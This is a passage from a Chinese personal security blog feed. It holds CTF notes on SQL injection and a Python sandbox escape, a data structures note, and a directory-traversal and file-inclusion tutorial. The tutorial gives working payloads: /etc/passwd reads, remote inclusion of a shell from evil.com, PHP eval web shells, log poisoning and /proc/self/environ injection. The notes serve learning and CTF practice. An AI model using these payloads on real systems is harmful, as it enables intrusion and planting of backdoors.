preparable_stmt;<br></code></pre></td></tr></table></figure><p>执行预处理语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXECUTE</span> stmt_name [<span class="hljs-keyword">USING</span> <span class="hljs-variable">@var_name</span> [, <span class="hljs-variable">@var_name</span>] ...];  <span class="hljs-comment">-- execute: 执行</span><br></code></pre></td></tr></table></figure><p>删除(释放)定义</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DEALLOCATE</span><span class="hljs-operator">|</span><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">PREPARE</span> stmt_name;  <span class="hljs-comment">-- deallocate: 解除分配</span><br></code></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;;PREPARE jwt from concat(char(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>), &#x27; * from `<span class="hljs-number">1919810931114514</span>` &#x27;);EXECUTE jwt;#<br></code></pre></td></tr></table></figure><p>卧槽…..这操作…..</p><h2 id="不算方法的姿势-md5闭合sql语句"><a href="#不算方法的姿势-md5闭合sql语句" class="headerlink" title="不算方法的姿势: md5闭合sql语句"></a>不算方法的姿势: md5闭合sql语句</h2><p>算是用来开扩思路的吧<br>[BJDCTF2020 ]Easy MD5 进入页面，发现就一个表单提交窗口，提交了啥也8淦, 也么有提示…这题让我感觉应该做个关于如何在ctf里找hint的总结….总之今天比较眼花，做了几道题都找8到hint</p><p>看了看wp，发现在抓包后返回的response里有hint: Hint: select * from ‘admin’ where password&#x3D;md5($pass,true)<br>混在response头里，就踏马离谱….(真实的渗透怎么会用到这种技巧啊我丢)</p><p>所以，根据这个hint，显然是sql注入，进行构造…..个p，这….能构造吗? 闭合8了啊<br>看wp，发现还真能闭合…..无知限制了我的想象力….(因为8知道md5的值阔以是任何数，以及md5返回的值是二进制流，以及sql的select语句的1个特性…)<br>也就是说如果md5值经过hex转成字符串后为 ‘or’+balabala这样的字符串，则拼接后，当’or’后的语句值为true时，就阔以实现绕过…</p><p>再来看sql语句的1个特性: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `admin` <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;1abcdefg&#x27;</span>    <span class="hljs-comment">---&gt;  True</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `admin` <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;0abcdefg&#x27;</span>    <span class="hljs-comment">---&gt;  False</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `admin` <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;1&#x27;</span>           <span class="hljs-comment">---&gt;  True</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `admin` <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;2&#x27;</span>           <span class="hljs-comment">---&gt;  True</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `admin` <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;0&#x27;</span>           <span class="hljs-comment">---&gt;  False</span><br></code></pre></td></tr></table></figure><p>然后你懂的，网上找1个比较常见的: ‘ffifdyop’，这个字符串被md5加密后就满足’or 1+balabala’的形式，真是骚操作啊，实在么想到</p><h2 id="outfile关键字"><a href="#outfile关键字" class="headerlink" title="outfile关键字"></a>outfile关键字</h2><p>outfile是将检索到的数据，保存到服务器的文件内：<br>格式：select * into outfile “文件地址”<br>eg:</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">mysql&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;f:/mysql/test/one&#x27;</span> <span class="hljs-keyword">from</span> teacher_class;<br></code></pre></td></tr></table></figure><p>然后你生成了文件之后再通netcat或菜刀去连就好<br>(tips:如果你第一次生成了1个文件，第二次写入文件就要换个名字，要不然第一个文件是无法改写的)</p><h2 id="datadir"><a href="#datadir" class="headerlink" title="datadir"></a>datadir</h2><p>datadir是MySQL数据存储位置，是默认的相对位置</p><p>查询时候加上@@ 如@@secure_file_priv、@@datadir<br>eg: </p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">select <span class="hljs-built_in">database</span>(),<span class="hljs-built_in">user</span>() @<span class="hljs-keyword">@datadir</span> into outfile <span class="hljs-string">&#x27;5h1t/t3xt.php&#x27;</span><br></code></pre></td></tr></table></figure><p>把你要爆的信息写入文件，再用netcat、菜刀啦什么的访问</p><h2 id="secure-file-priv"><a href="#secure-file-priv" class="headerlink" title="secure_file_priv"></a>secure_file_priv</h2><p>secure_file_priv 用来限制导出效果。他有三个属性：<br>null: 限制不能导出<br>为空: 可以自定义<br>为路径: 则只能导出到指定路径</p><p>待更</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NCTF,心态裂开</title>
    <link href="/2021/11/28/NCTF-%E5%BF%83%E6%80%81%E8%A3%82%E5%BC%80/"/>
    <url>/2021/11/28/NCTF-%E5%BF%83%E6%80%81%E8%A3%82%E5%BC%80/</url>
    
    <content type="html"><![CDATA[<p>？？既然创建了那就写完<br>这次比赛输出很惨烈，回去再练练吧</p><p>本来2人组了个摆烂队准备签个到，中途加进来了zsky师傅说一起摆，然后大佬出了4个re一血贡献了2000分，俺们两个加起来贡献了400分，俺作为web手输出了个签到呜呜呜</p><p>复盘<br>(<a href="https://ctf.njupt.edu.cn/727.html">官方wp</a>)</p><p>太废物了</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><p>payload:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?username[<span class="hljs-number">0</span>]=<span class="hljs-keyword">exp</span>&amp;username[<span class="hljs-number">1</span>]=<span class="hljs-keyword">sleep</span>(<span class="hljs-keyword">if</span>(((<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span>(database())),<span class="hljs-number">11</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&quot;f&quot;</span>)),<span class="hljs-number">10</span>,<span class="hljs-number">0</span>))&amp;username[<span class="hljs-number">2</span>]=<span class="hljs-number">1</span><span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span>(database())),<span class="hljs-number">11</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&quot;f&quot;</span><br></code></pre></td></tr></table></figure><p>脚本:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Python沙盒绕过"><a href="#Python沙盒绕过" class="headerlink" title="Python沙盒绕过"></a>Python沙盒绕过</h2><p>关键在于学python，而8是学姿势，因为姿势太多了…..</p><p>题目的话，是要给1个QQ_bot发送payload以获取flag，因为时隔已久，所以也没保存截图啥的</p><p>有个附件，里面是代码，当时心态大崩所以连打开康康的勇气都没了…<br>事实上这个决定也没戳，看了大佬的wp后，这道题要想有个思路啥的至少得有150点Python精通，像什么__doc__之类的我一个写爬虫的屑辣鸡压根没听过….(虽然如此，但绕过的方法应该8止这一种)</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>下载附件，是python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode, b64encode<br><br>code = sys.argv[<span class="hljs-number">1</span>]  <span class="hljs-comment">#即给程序的第一个参数</span><br><span class="hljs-keyword">try</span>:<br>    data = b64decode(code.encode()).decode()   <span class="hljs-comment">#code.encode(): 把code转化为字节码; 然后base64解码，然后再返回去</span><br><span class="hljs-keyword">except</span>:      <span class="hljs-comment"># 若触发异常的解决方案</span><br>    exit(<span class="hljs-number">0</span>)   <span class="hljs-comment">#那就是退出辣</span><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;h&quot;\&#x27;(&#x27;</span>:  <span class="hljs-comment"># 屏蔽一些字符   </span><br>    <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> data: exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-built_in">exec</span>(data)  <span class="hljs-comment"># 执行命令(在python环境下)</span><br><br></code></pre></td></tr></table></figure><p>思路: 写在理解后<br>首先，输入字符串，被base64解码，再被屏蔽掉 h “ ‘ \ ( 这些字符，然后进行exec</p><p>那么就阔以通过利用差8多exec(“os.system(‘xxx’)”)的形式进行操作, 但是里面的单引号和xxx怎么绕过呢?<br>阔以通过先构造1个字符串a，然后以exec(“os.system(a)”)的形式操作。但是构造字符串还是需要单引号啊<br>这里就有8止一种绕过方法了，wp是通过__doc__来绕过单引号，暂时也想不出别的方法能绕过呜呜呜<br>怎么通过__doc__绕过呢? 阔以看后面的扫盲</p><p>然后这个问题也就解决了，就阔以构造payload了<br>那么就又又问题了，屏蔽了括号，怎么绕过?</p><p>然后看的wp里构造payload需要了解 函数装饰器，这个也咩听过,后来学的,在有关python的博客文章里做笔记了，这里就掠过</p><p>然后，接下来应该由你自己实现构造了，骚年!!!</p><p>可是….构造装饰函数时也需要用到括号啊…….莫非有什么👴8知道的姿势?</p><p>payload: 比方我要输入命令ls:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>a=&#123;&#125;.__doc__<br>cmd=a[<span class="hljs-number">69</span>] + a[<span class="hljs-number">97</span>] <span class="hljs-comment"># ls</span><br>x=<span class="hljs-keyword">lambda</span> _:cmd   <span class="hljs-comment">#匿名函数x返回结果为cmd, 即&#x27;ls&#x27;</span><br><span class="hljs-meta">@os.system     </span><span class="hljs-comment"># 第一层修饰</span><br><span class="hljs-meta">@x            </span><span class="hljs-comment"># 第二层修饰</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">_</span>: <span class="hljs-keyword">pass</span>  <span class="hljs-comment">#装饰器修饰的对象工具人，至于这里的class是什么意思....8知道了，网上没搜到，可能与类的声明有关(可这明明是函数啊)</span><br><span class="hljs-comment"># 就相当于:     先执行class=x(class),结果是增加了返回&#x27;ls&#x27;的语句， 然后是class=os.system(class)</span><br></code></pre></td></tr></table></figure><h3 id="扫盲"><a href="#扫盲" class="headerlink" title="扫盲"></a>扫盲</h3><h4 id="doc"><a href="#doc" class="headerlink" title="doc"></a><strong>doc</strong></h4><p>是个说明文档，用来帮助py使用者们理解的功能，eg: 略</p><p>他还有个功能就是这个:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">a=&#123;&#125;.__doc__<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">350</span>,<span class="hljs-number">350</span>):<br>    <span class="hljs-built_in">print</span>(a[i])<br></code></pre></td></tr></table></figure><p>结果(去掉换行符)是一句话: </p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">dictionarydict(mapping)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedfromamappingobject</span>&#x27;s(key,value)pairsdict(iterable)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedasifvia</span>:d=&#123;&#125;fork,viniterable:<span class="hljs-type">d</span>[k]=vdict(**kwargs)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedwiththename</span>=valuepairsinthekeywordargumentlist.Forexample:<span class="hljs-type">dict</span>(one=<span class="hljs-number">1</span>,two=<span class="hljs-number">2</span>)dict()-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">emptydictionarydict</span>(mapping)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedfromamappingobject</span>&#x27;s(key,value)pairsdict(iterable)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedasifvia</span>:d=&#123;&#125;fork,viniterable:<span class="hljs-type">d</span>[k]=vdict(**kwargs)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedwiththename</span>=valuepairsinthekeywordargumentlist.Forexample:<span class="hljs-type"></span><br></code></pre></td></tr></table></figure><p>这句话是啥意思8要紧，但是里面有26个英文字母，阔以帮助俺们绕过，eg: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">a=&#123;&#125;.__doc__<br>a[-<span class="hljs-number">348</span>]+a[-<span class="hljs-number">343</span>]+a[<span class="hljs-number">334</span>]+a[<span class="hljs-number">336</span>]+a[<span class="hljs-number">75</span>]+a[<span class="hljs-number">69</span>]+a[-<span class="hljs-number">343</span>]+a[<span class="hljs-number">42</span>]  <span class="hljs-comment">#就是字符串&#x27;cat flag&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>赛事</category>
      
    </categories>
    
    
    <tags>
      
      <tag>赛事</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构笔记??</title>
    <link href="/2021/11/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/11/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="stdarg-h"><a href="#stdarg-h" class="headerlink" title="stdarg.h"></a>stdarg.h</h1><h2 id="void-va-start-va-list-ap-last-arg"><a href="#void-va-start-va-list-ap-last-arg" class="headerlink" title="void va_start(va_list ap, last_arg)"></a>void va_start(va_list ap, last_arg)</h2><p>这个宏初始化 ap 变量，它与 va_arg 和 va_end 宏是一起使用的。last_arg 是最后一个传递给函数的已知的固定参数，即省略号之前的参数</p><h2 id="type-va-arg-va-list-ap-type"><a href="#type-va-arg-va-list-ap-type" class="headerlink" title="type va_arg(va_list ap, type)"></a>type va_arg(va_list ap, type)</h2><p>这个宏检索函数参数列表中类型为 type 的下一个参数</p><h2 id="void-va-end-va-list-ap"><a href="#void-va-end-va-list-ap" class="headerlink" title="void va_end(va_list ap)"></a>void va_end(va_list ap)</h2><p>这个宏允许使用了 va_start 宏的带有可变参数的函数返回。如果在从函数返回之前没有调用 va_end，则结果为未定义</p><h1 id="union"><a href="#union" class="headerlink" title="union"></a>union</h1><p>略，注意其大小由最大的组成部分决定</p><h1 id="广义表"><a href="#广义表" class="headerlink" title="广义表"></a>广义表</h1><p>typedef enum{<br> Atom,List<br>}ElemTag;<br>typedef struct GLNode{<br>    ElemTag tag;<br>    union{<br>        AtomType atom;<br>        struct GLNode *hp;<br>    };<br>    struct GLNode *tp;<br>}*GList;</p><h1 id="先、中、后序遍历"><a href="#先、中、后序遍历" class="headerlink" title="先、中、后序遍历"></a>先、中、后序遍历</h1><p>先序：考察到一个节点后，即刻输出该节点的值，并继续遍历其左右子树。(根左右)</p><p>中序：考察到一个节点后，将其暂存，遍历完左子树后，再输出该节点的值，然后遍历右子树。(左根右)</p><p>后序：考察到一个节点后，将其暂存，遍历完左右子树后，再输出该节点的值。(左右根)</p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>目录穿越&amp;文件包含漏洞</title>
    <link href="/2021/11/19/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A&amp;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/11/19/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A&amp;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>原理很简单的漏洞吧，主要就是各种绕过+组合</p><!-- about --><h1 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h1><p>eg:<br><a href="https://www.*****.com/loadImage?filename=../../../etc/passwd">https://www.*****.com/loadImage?filename=../../../etc/passwd</a><br>filename的参数值与真实路径组合起来就是：<br>&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<br>其等价于：<br>&#x2F;etc&#x2F;passwd<br>..&#x2F;：上一级目录；.&#x2F;：当前目录；&#x2F;：根目录</p><h2 id="可能出现的情况"><a href="#可能出现的情况" class="headerlink" title="可能出现的情况"></a>可能出现的情况</h2><p>比如前端是这么写的: </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/loadImage?filename=214.png&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h2><h3 id="绝对路径绕过"><a href="#绝对路径绕过" class="headerlink" title="绝对路径绕过"></a>绝对路径绕过</h3><p>web网站有时候会采取目录遍历的防御措施，如过滤 ..&#x2F; 上一级等关键字，可以试试绝对路径绕过，无须..&#x2F;返回上一级目录遍历：filename&#x3D;&#x2F;etc&#x2F;passwd<br>至于&#x2F;etc&#x2F;passwd，是linux常见目录…</p><h3 id="双写-绕过"><a href="#双写-绕过" class="headerlink" title="双写..&#x2F;绕过"></a>双写..&#x2F;绕过</h3><p>若防御措施是把关键词替换为空(我觉得这种概率很小)，可以采用双写绕过</p><h3 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h3><p>.   &#x3D;&gt;  %2e<br>&#x2F;   &#x3D;&gt;  %2f<br>% &#x3D;&gt; %25  (双重URL编码)</p><h3 id="nginx绕过"><a href="#nginx绕过" class="headerlink" title="nginx绕过"></a>nginx绕过</h3><p>参考链接: <a href="https://blog.csdn.net/weixin_42586723/article/details/122944781">https://blog.csdn.net/weixin_42586723&#x2F;article&#x2F;details&#x2F;122944781</a><br>大概: Nginx在nginx.conf文件配置别名(Alias)的时候，如果忘记加&#x2F;，将造成一个目录穿越漏洞<br>eg: </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/files../</span><br></code></pre></td></tr></table></figure><p>原理: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">location /files &#123;<br>    autoindex on;<br>    <span class="hljs-built_in">alias</span> /home/;<br>&#125;<br>会造成目录穿越，应把/files改成/fiels/<br>(我有个问题昂，就是如果改成/files/，那我payload就8能换成https://example.com/files/../ 吗)<br></code></pre></td></tr></table></figure><h3 id="UNC绕过"><a href="#UNC绕过" class="headerlink" title="UNC绕过"></a>UNC绕过</h3><p>payload: </p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\\localhost\c$\windows\win.ini<br></code></pre></td></tr></table></figure><p>UNC(Universal Naming Convention): 通用命名规则<br>C:\WINDOWS\Win.ini: 该文件为重要的系统文件。默认保存在C:\Windows\win.ini(相同目录下还有system.ini)，里面的内容大概长这样:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; for 16-bit app support</span><br><span class="hljs-section">[fonts]</span><br><span class="hljs-section">[extensions]</span><br><span class="hljs-section">[mci extensions]</span><br><span class="hljs-section">[files]</span><br><span class="hljs-section">[Mail]</span><br><span class="hljs-attr">MAPI</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>由于语言特性，该漏洞在php里居多，在jsp、asp里很少，所以主要讨论php里的<br>举个常见的文件包含漏洞的形式: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;inc/&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过这个漏洞，可以执行或显示php代码，为此可以与文件上传、文件写入等漏洞配合</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>PHP中的文件包含分为本地文件包含和远程文件包含</p><h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p>本地文件包含 Local File Include (LFI)<br>所包含文件内容符合PHP语法规范，任何扩展名都可以被PHP解析。<br>所包含文件内容不符合PHP语法规范，会暴露其源代码（相当于文件读取）。</p><h3 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h3><p>远程文件包含 Remote File Include (RFI)<br>如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include&#x3D;off），开启远程包含功能需要在php.ini配置文件中修改。<br>远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，但是一般遇8到…</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">如果支持远程文件包含，那么直接<span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">9999</span>/index.php?<span class="hljs-built_in">file</span>=<span class="hljs-keyword">http</span>://evil.com/<span class="hljs-built_in">shell</span>.php 即可<span class="hljs-built_in">get</span> <span class="hljs-built_in">shell</span><br></code></pre></td></tr></table></figure><h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><p>4个<br>include：找不到被包含的文件时只会产生警告，脚本将继续执行。<br>include_once：和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。<br>require：找不到被包含的文件时会产生致命错误，并停止脚本。<br>require_once：和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</p><h2 id="使用php封装协议读取"><a href="#使用php封装协议读取" class="headerlink" title="使用php封装协议读取"></a>使用php封装协议读取</h2><p>正常情况下，包含php文件只会执行其中的代码，但如果我们想获取到php文件的源码，如config.php，那么我们可以通过封装协议php:&#x2F;&#x2F;filter来读取<br><a href="http://localhost/index.php?file=php://filter/read=convert.base64-encode/resource=shell.png">http://localhost/index.php?file=php://filter/read=convert.base64-encode/resource=shell.png</a></p><p>php:&#x2F;&#x2F;input<br>利用条件: 需要开启allow_url_include&#x3D;on，对allow_url_fopen不做要求<br>大概就是Get传参时写?file&#x3D;php:&#x2F;&#x2F;input<br>然后用Post传参(或者直接改包)，像这样:<br><img src="/images/note/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1.png"></p><p>data伪协议读取文件，要求 allow_url_include&#x3D;On: </p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?file=data://text/plain;base64,c2gxdC5waHA=</span><br><span class="language-xml">?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="LFI-文件上传getshell"><a href="#LFI-文件上传getshell" class="headerlink" title="LFI+文件上传getshell"></a>LFI+文件上传getshell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">先文件上传<span class="hljs-number">1</span>个木马如: <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br>然后进行利用: <br>http:<span class="hljs-comment">//localhost/index.php?file=shell.png&amp;shell=phpinfo();</span><br>这里我有个问题: 既然都上传了，那为啥不直接用蚁剑连呢? <br></code></pre></td></tr></table></figure><h2 id="LFI-日志注入getshell"><a href="#LFI-日志注入getshell" class="headerlink" title="LFI+日志注入getshell"></a>LFI+日志注入getshell</h2><p>日志文件往往会包含我们的请求记录，如果我们知道日志的文件位置，就可以将恶意的php代码写入到日志中，然后再通过文件包含漏洞执行相关的代码</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">实际操作起来简单的8可思议，比如访问 http://localhost/index.php?file=shell.png&amp;test=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> </span><br><span class="language-xml">然后它就会被记录到日志文件，然后我们只要包含这个日志文件，就可以执行代码了.....(8会出现语法错误什么的吗...)</span><br></code></pre></td></tr></table></figure><p>日志默认路径:<br>tomcat: &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;logs&#x2F;localhost_access_log.2020-09-21.txt<br>apache+linux: &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access.log<br>nginx: &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;access.log</p><h2 id="LFI-proc-self-environ-getshell"><a href="#LFI-proc-self-environ-getshell" class="headerlink" title="LFI+&#x2F;proc&#x2F;self&#x2F;environ getshell"></a>LFI+&#x2F;proc&#x2F;self&#x2F;environ getshell</h2><p>在linux中，如果php以cgi方式运行(啥是cgi捏，建议学好网络通信基础)，那么&#x2F;proc&#x2F;self&#x2F;environ目录中会包含请求头中的UA(User-Agent)信息，那么这个User-Agent自然可以是木马啦，然后就能getshell了(我次奥，这么随意的吗)<br>具体操作: 抓包，改包:<br>GET lfi.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;environ HTTP&#x2F;1.1<br>User-Agent: <?php phpinfo();?><br>比如上述信息在发送后就可以显示phpinfo，次奥….</p><h2 id="LFI-Session-getshell"><a href="#LFI-Session-getshell" class="headerlink" title="LFI+Session getshell"></a>LFI+Session 